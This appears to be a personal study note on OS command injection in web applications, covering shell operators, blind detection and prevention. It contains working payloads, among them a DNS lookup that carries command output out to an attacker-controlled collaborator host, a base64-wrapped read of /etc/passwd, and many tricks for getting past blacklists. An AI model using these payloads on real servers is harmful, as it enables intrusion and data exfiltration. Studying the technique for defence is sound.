
### General Notes

Command injection allows attackers to execute system commands on the hosting server running a web application. It mainly arises from the idea of accepting user input into a query without being properly sanitized, allowing for an escape into the system.

> Can be used to compromise the hosting infrastructure and exploit relationships to pivot the attack.

Types of injections:
* OS Command injections: User input is used as an OS command.
* Code injections: User input is in a function that evaluates code.
* [[SQL Injections]]: User input is used in an SQL query.
* [[Cross Site Scripting (XSS)]]: User input is displayed on the web page.

> Web applications use functions to execute commands directly on the back-end server. If these commands accept user input, attackers can escape bounds and execute commands in an unrestricted manner.
* PHP: `exec`, `system`, `shell_exec`, `passthru`,  `popen`.
* [[NodeJs]]: `child_process.exec`.

---
### Important Shell Characters and Detection

* `&` : First command in the background, and the second command running simultaneously.
* `&&`: Will execute the second command if the first one works.
* `|`: Will take the output from the first command and execute the second command.
* `||`: If the first command fails, the second one is executed.

> Important to note that the [[Web Encoding]] of these shell characters should also be used.

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                              |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------------- |
| Semicolon              | `;`                     | `%3b`                     | Both. Does not work on windows CMD.               |
| New Line               | `\n`                    | `%0a`                     | Both                                              |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first)        |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)                |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)                     |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)                      |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                                 |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only). Known as command substitution. |

#### Detection

Injecting these characters in places that accept user input and observing unexpected behavior is a sign that this injection point might be vulnerable. 

> Check whether the response is coming from the backend or the fronted. Do this using the networks tab.
* If no request was sent after trying out a malicious payload, then this is front end validation, which can be easily bypassed using a proxy like [[Burp Suite]].

Another check to do is whether there is a Web Application [[Firewall]] in place. If an error is returned in a different page with information relating to our [[IP]] and request, then this request might have been denied by a WAF.

---

### Injection

Identifying points in the website where user input has access to backend server/database. If the application executes a shell command and returns the raw output, then we can exploit this injection point.

* Using the `&` operator, can execute multiple commands at the same time.
```
& whoami &
```

The `&` at the end because it separates the injected command from whatever follows.

> Make sure to differentiate between this `&` and the `&` in the URL for adding multiple parameters.

#### Blind Injections

The output of the command isn't seen in the [[HTTP]] response, therefore, other methods should be used to discover injection points.
##### Time Delays

* Can use a time delay. The `ping` command is useful as it works for 10 seconds, therefore our command will return a response after 10 seconds.
```
& ping -c 10 127.0.0.1 &
```

The output can be redirected into a file in the web application with open access from the browser.

* Can write into the `static` directory: `/var/www/static/<file-name>`
```
& whoami > /var/wwww/static/whoami.txt &
```

* This `whoami.txt` file can then be seen by adding it in the URL.
```
https://<URL>/whoami.txt
```

##### OAST

* Blind injections can also be discovered using out of band techniques, such as performing a [[Domain Name System (DNS)]] lookup of a server we have control over, such as the [[Burp Suite]] collaborator server.
```
x||nslookup <burp-collab-payalod>||
```
> We can get the collaborator payload by right clicking in the repeater and choosing insert collaborator payload.
 
Then, we can observe the `nslookup` by checking the collaborator server logs to see the results of our injection.

* We can append the data we need to extract as a subdomain of the collaborator server.
```
x||nslookup `whoami`.<burp-collab-payload>||
```

---

### Escaping Blacklists

Blacklists prevent certain characters or words from being accepted as input. However, this isn't the beset defense mechanism as there are many replacements and substitutions we can use instead.

> All techniques are explained [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
#### Space

If the space is blacklisted, these are other options:
1. Using tab instead: `%09`.
2. Using `${IFS}` environment variable whose default value is a space and a tab.
3. Using brace expansion: `{cmd_1, cmd_2, cmd_3}`. This automatically adds braces in between the arguments of the braces.

> The tab and `$(IFS)` are placed instead of the spaces during injection. The brace expansion replaces the whole input payload.

#### Using Environment Variables

We can use string slicing on environment variables to use blacklisted characters. All the environment variables can be printed with the `printenv` command.
* The `/` slash can be obtained from the `PATH` variable:
```bash
${PATH:0:1}
```
* The `;` semicolon can be obtained from the `LS_COLORS` variable:
```bash
${LS_COLORS:10:1}
```

> This command takes a substring starting from the first index with length of second index.

#### Character Shifting

We can use the ASCII table and shift from normal characters to ones that are blacklisted.
* We want the `\` character, so we shift by 1 the `[` character that is directly before it in the ASCII table.
```bash
$(tr '!-}' '"-~'<<<[)
```
> Simply replace the `[` with another character that is directly before a desired character.

#### Commands

If certain commands are blacklisted, then are there are techniques used to obfuscate them but still let them achieve their intended purpose.

1. If the application is checking for an exact word match, sending the same command but obfuscated will pass through this check.

* Linux/Windows: Inserting `'` or `"` in between the command characters.
```bash
wh'oa'mi
w"h"o"a"mi
```
> Qoute types cannot be mixed, and their number must be even, not odd.

* Linux only: Insert `\` or `$@` in between the command characters.
```bash
who\a\m\i
who$@ami
```
> If these characters are filtered, use the environment variables technique to get these characters first and then place them inside the command.

* Windows only: Insert `^` in between the command characters.
```cmd
who^ami
```

* Case manipulation. Blacklists might not check all case versions of a word.
1. Inverting the entire case. (All caps)
2. Alternating between cases.
```bash
WHOAMI
wHoAmI
```

> For linux and bash shells, commands are case sensitive. Therefore, we need to return them to their original case.

```bash
$(tr "[A-Z]" "[a-z]"<<<"WHOAMI")
```

* Reversed commands. First we get the reverse of the command we want, then we can send the reversed command with some reversing functionality that returns it back to normal.
1. Linux
```bash
echo 'whoami' | rev  # outputs imaohw
$(rev<<<'imaohw') 
```
2. Windows powershell
```bash
"whoami"[-1..-20] -join '' # outputs imaohw
iex "$('imaohw'[-1..-20] -join '')"
```

* Encoding the commands, this can be used to evade firewalls and filters. First we get the encoding, then we can send the encoding with its decoding functionality.

```bash
echo 'cat /etc/passwd' | base64   # outputs the base64 encoding of this command.
bash<<<$(base64 -d<<<_encoding_here_)
```

---

### Automated Tools

These tools perform advanced obfuscation techniques that we cannot do in a manual fashion. 
##### [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

This is a linux tool that picks random obfuscation technique. We can specify what we need using flags.
##### [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

This is a windows tool that is interactive. 

---
### Useful Commands

> Useful commands to execute if an injection is discovered.

* `whoami` for the user.
* `uname -a` for the OS.
* `ifconfig` for the network. [[Networking/Routing|Routing]]
* `netstat -an` for the network connections. [[Port]]
* `ps -ef` for the running processes. 

---

### Preventing Command Injection Attacks

* Never call out to OS commands from application layer.
* If that is not the case, then strong input validationr required.
	* Validating against whitelist.
	* Validating data type.
* Input sanitization and validation.
* Server configuration.
	* Limit the scope of accessibility by the web application.
	* Reject requests with encodings.
	* Use web application [[Firewall]]s.
	* Run the web server as a low privileged user.

---
